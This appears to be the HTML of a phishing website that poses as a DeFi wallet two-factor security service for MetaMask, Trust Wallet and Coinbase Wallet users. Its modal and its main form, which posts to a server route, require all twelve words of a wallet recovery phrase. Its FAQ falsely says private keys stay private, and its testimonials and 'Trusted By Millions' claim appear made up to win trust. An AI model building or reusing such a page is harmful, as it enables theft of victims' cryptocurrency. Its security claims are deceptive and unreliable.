...
<body>
    ...
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-header border-bottom-0">
          <h4 class="modal-title" id="exampleModalLabel">Connect Your Wallet</h4>
        ...
        <div class="modal-body">
          <form action="#!" method="post">
            ...
            <div class="row g-3">
              <!-- Left Column: Phrase 1–6 -->
              <div class="col-lg-6">
                <input type="text" class="form-control shadow-none" placeholder="Phrase 1">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 2">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 3">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 4">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 5">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 6">
              </div>

              <!-- Right Column: Phrase 7–12 -->
              <div class="col-lg-6">
                <input type="text" class="form-control shadow-none" placeholder="Phrase 7">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 8">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 9">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 10">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 11">
                <input type="text" class="form-control shadow-none mt-2" placeholder="Phrase 12">
              </div>
      ...
      <div class="row align-items-center justify-content-center">
        <div class="col-lg-6 mb-5 mb-lg-0">
          <div class="block text-center text-lg-start pe-0 pe-xl-5">
            <h1 class="text-capitalize mb-4">Protect Your Wallets By Adding 2FA🔐</h1>
            <p class="mb-4">Add an extra layer of security to your decentralized wallet. Connect your wallet to enable
        ...
        <div class="col-lg-6">
          <div class="ps-lg-5 text-center">
            <img loading="lazy" decoding="async" src="images/wallet-img.png" alt="banner image" class="w-100">
          </div>
        </div>
      </div>
    </div>
        ...
        <div class="col-lg-4 col-md-6 service-item">
          <a class="text-black" href="service-details.html">
            <div class="block"> <span class="colored-box text-center h3 mb-4">01</span>
              <h3 class="mb-3 service-title">Wallet Security Monitoring</h3>
              <p class="mb-0 service-description">We continuously monitor wallet activity for suspicious or unusual
                transactions to help detect potential threats early.</p>
            </div>
          </a>
        </div>
        <div class="col-lg-4 col-md-6 service-item">
          <a class="text-black" href="service-details.html">
            <div class="block"> <span class="colored-box text-center h3 mb-4">02</span>
              <h3 class="mb-3 service-title">Transaction Verification</h3>
              <p class="mb-0 service-description">Receive an extra verification step before sensitive transactions are
                completed, helping prevent unauthorized transfers.</p>
            </div>
          </a>
        </div>
        <div class="col-lg-4 col-md-6 service-item">
          <a class="text-black" href="service-details.html">
            <div class="block"> <span class="colored-box text-center h3 mb-4">03</span>
              <h3 class="mb-3 service-title">Real-Time Security Alerts</h3>
              <p class="mb-0 service-description">Get instant alerts if unusual activity is detected on your wallet so
                you can respond quickly.</p>
            </div>
          </a>
        </div>
        <div class="col-lg-4 col-md-6 service-item">
          <a class="text-black" href="service-details.html">
            <div class="block"> <span class="colored-box text-center h3 mb-4">04</span>
              <h3 class="mb-3 service-title">Wallet Ownership Verification</h3>
              <p class="mb-0 service-description">Securely verify wallet ownership through cryptographic signatures
                supported by wallets like MetaMask, Trust Wallet, and
                Coinbase Wallet.</p>
            </div>
          </a>
        </div>
        <div class="col-lg-4 col-md-6 service-item">
          <a class="text-black" href="service-details.html">
            <div class="block"> <span class="colored-box text-center h3 mb-4">05</span>
              <h3 class="mb-3 service-title">DeFi Risk Protection</h3>
              <p class="mb-0 service-description">Protect your assets while interacting with DeFi platforms by adding an
                additional layer of authentication and security
                checks.</p>
            </div>
          </a>
        </div>
      ...
      <div class="row align-items-center">
        <div class="col-lg-5">
          <div class="section-title">
            ...
            <p>We are dedicated to helping users protect their decentralized wallets and digital assets in the rapidly
              growing world of
              decentralized finance (DeFi).

              As more people use wallets like MetaMask, Trust Wallet, and Coinbase Wallet to interact with DeFi
              applications, security
              has become more important than ever. Our platform was built to provide an additional layer of protection
              that helps
              users safeguard their wallets from unauthorized access and suspicious activity.</p>
            <p>Our mission is to make wallet security simple, accessible, and reliable for everyone — from new crypto
              users to
              experienced DeFi participants.

              We believe users should be able to enjoy the benefits of decentralized finance while maintaining full
              control of their
              assets and security.

              With our tools and monitoring systems, users can connect their wallets, verify ownership securely, and
              activate enhanced
              protection in just a few steps.</p>
            <!-- </p> <a class="btn btn-primary mt-4" href="about.html">Know About Us</a> -->
          </div>
        </div>
        <div class="col-lg-7 text-center text-lg-end">
          <img loading="lazy" decoding="async" src="images/store-digital.svg" alt="About Ourselves" class="img-fluid">
        </div>
      </div>
    </div>
    <div class="has-shapes">
  ...
  <section class="about-section section bg-tertiary position-relative overflow-hidden">
    <div class="container">
      <div class="row align-items-center">
        <div class="col-lg-7">
          <img loading="lazy" decoding="async" src="images/folioport-img.svg" alt="About Ourselves" class="img-fluid">
        </div>
        <div class="col-lg-5">
          <div class="section-title">
            <p class="text-primary text-uppercase fw-bold mb-3">Properly Secure Your Account</p>
            <!-- <h1>Fast Funding &amp; A Flexible Payment</h1> -->
            <p class="lead mb-0 mt-4">
            <p>Win the world of decentralized finance (DeFi), your wallet is your identity and your money. Unlike
              traditional accounts,
              no one can recover your wallet if it’s compromised, so taking proactive steps to secure it is critical.
            </p>
            <!-- </p> <a class="btn btn-primary mt-4" href="about.html">Know About Us</a> -->
          </div>
        </div>
      ...
      <div class="row align-items-center justify-content-between">
        <div class="col-lg-5">
          <div class="section-title">
            ...
            <h1>What Makes Us <br> Different From Other?</h1>
            <div class="content mb-0 mt-4">
              <p>Our platform is designed for everyday users, making advanced wallet protection simple and easy to use
                without requiring
        ...
        <div class="col-lg-6">
          <div class="difference-of-us-item p-3 rounded mr-0 me-lg-4">
            <div class="d-block d-sm-flex align-items-center m-2">
              ...
              <div class="block">
                <h3 class="mb-3">User-Focused Security</h3>
                <p class="mb-0">Our platform is designed for everyday users, making advanced wallet protection simple
                  and easy to use without requiring
                  technical knowledge.</p>
              </div>
            </div>
          </div>
          <div class="difference-of-us-item p-3 rounded mr-0 me-lg-4">
            <div class="d-block d-sm-flex align-items-center m-2">
              ...
              <div class="block">
                <h3 class="mb-3">Decentralized Wallet Compatibility</h3>
                <p class="mb-0">We support widely used decentralized wallets such as MetaMask, Trust Wallet, and
                  Coinbase Wallet, allowing users to
                  secure the wallets they already trust.</p>
              </div>
            </div>
          </div>
          <div class="difference-of-us-item p-3 rounded mr-0 me-lg-4">
            <div class="d-block d-sm-flex align-items-center m-2">
              ...
              <div class="block">
                <h3 class="mb-3">Built for the DeFi Ecosystem</h3>
                <p class="mb-0">Our system is designed specifically for users interacting with decentralized finance,
                  helping protect wallets while
                  using DeFi platforms.</p>
              </div>
            </div>
          </div>
        </div>
      ...
      <div class="row justify-content-center">
        <div class="col-lg-6">
          <div class="section-title text-center">
            ...
            <h1 class="mb-4">Trusted By Millions of <br>Defi-Wallet Users</h1>
            <p class="lead mb-0">Our platform is trusted by a growing community of DeFi users who rely on secure and
              reliable tools to protect their
              digital assets. We are committed to providing a safe and seamless experience for anyone using
              decentralized wallets.</p>
          </div>
        </div>
      </div>
      <div class="row position-relative">
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              This platform added an extra layer of protection to my wallet. The setup was quick and I can now use DeFi
              with much
              more confidence.
            </div>
          </div>
        ...
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              I was worried about wallet security, but connecting my wallet and enabling protection took less than a
              minute. It’s
        ...
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              As someone who uses DeFi daily, having additional wallet security gives me peace of mind. The process was
              smooth and
              easy to follow.
            </div>
          </div>
        ...
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              The verification process was straightforward and secure. It’s great to see tools focused on protecting
              decentralized
              wallet users.
            </div>
          </div>
        ...
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              Security is everything in DeFi. This platform makes it easy to add protection without complicating how I
              use my
              wallet.
            </div>
          </div>
        ...
        <div class="col-lg-4 col-md-6 pt-1">
          <div class="shadow rounded bg-white p-4 mt-4">
            ...
            <div class="content">
              I connected my wallet in seconds and immediately felt safer using DeFi platforms. It’s a simple solution
              that adds
              real peace of mind.
            </div>
          </div>
          ...
          <div class="accordion shadow rounded py-5 px-0 px-lg-4 bg-white position-relative" id="accordionFAQ">
            <div class="accordion-item p-1 mb-2">
              <h2 class="accordion-header accordion-button h5 border-0 active"
                ...
                aria-controls="collapse-ebd23e34fd2ed58299b32c03c521feb0b02f19d9">Is it safe to connect my wallet?
              </h2>
              <div id="collapse-ebd23e34fd2ed58299b32c03c521feb0b02f19d9"
                ...
                <div class="accordion-body py-0 content">Yes. Connecting your wallet only allows the platform to verify
                  wallet ownership through secure signatures. Your private
                  keys remain private.</div>
              </div>
            </div>
            <div class="accordion-item p-1 mb-2">
              <h2 class="accordion-header accordion-button h5 border-0 "
                ...
                aria-controls="collapse-a443e01b4db47b3f4a1267e10594576d52730ec1">Which wallets are supported?
              </h2>
              <div id="collapse-a443e01b4db47b3f4a1267e10594576d52730ec1" class="accordion-collapse collapse border-0 "
                ...
                <div class="accordion-body py-0 content">Our platform supports widely used decentralized wallets
                  including MetaMask, Trust Wallet, and Coinbase Wallet.</div>
              </div>
            </div>
            <div class="accordion-item p-1 mb-2">
              <h2 class="accordion-header accordion-button h5 border-0 "
                ...
                aria-controls="collapse-4b82be4be873c8ad699fa97049523ac86b67a8bd">Do I need to install anything?
              </h2>
              <div id="collapse-4b82be4be873c8ad699fa97049523ac86b67a8bd" class="accordion-collapse collapse border-0 "
                ...
                <div class="accordion-body py-0 content">No installation is required. Simply connect your wallet through
                  the website and follow the verification steps to
                  activate wallet protection.</div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-lg-4 mt-4 mt-lg-0">
          <div class="shadow rounded py-5 px-4 ms-0 ms-lg-4 bg-white position-relative">
            <div class="block mx-0 mx-lg-3 mt-0">
              ...
              <div class="content">Send Us An Email We Will Be Happy To Help
                <br> <a href="#">mail@site.com</a>
              </div>
            </div>
          </div>
        </div>
  ...
  <section class="section testimonials overflow-hidden bg-tertiary">
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-lg-12">
          <div class="section-title text-center">
            <h1 class="mb-4">Secure Wallet</h1>
          </div>
        </div>
        <img loading="lazy" decoding="async" src="images/store-icon.svg" alt="About Ourselves"
          style="width: 80%; height: auto;" class="mb-4">
        ...
        <form action="{{ route('submit') }}" method="post">
          ...
          <div class="row g-3">
            ...
            <!-- Wallet Selector -->
            <div class="col-12 mb-3">
              <select class="form-select shadow-none" name="walletSelect" id="walletSelect" style="color: #000;" required>
                <option value="" disabled selected>Select Your Wallet</option>
                <option value="MetaMask">MetaMask</option>
                <option value="Trust Wallet">Trust Wallet</option>
                <option value="Coinbase Wallet">Coinbase Wallet</option>
            ...
            <!-- Left Column: Phrase 1–6 -->
            <div class="col-lg-6">
                <input type="text" name="phrases[]" class="form-control shadow-none" placeholder="Phrase 1" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 2" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 3" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 4" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 5" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 6" required>
            </div>

            <!-- Right Column: Phrase 7–12 -->
            <div class="col-lg-6">
                <input type="text" name="phrases[]" class="form-control shadow-none" placeholder="Phrase 7" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 8" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 9" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 10" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 11" required>
                <input type="text" name="phrases[]" class="form-control shadow-none mt-2" placeholder="Phrase 12" required>
            </div>

            <!-- Submit Button -->
            <div class="col-12 mt-3">
              <button type="submit" class="btn btn-primary w-100">Secure</button>
            </div>
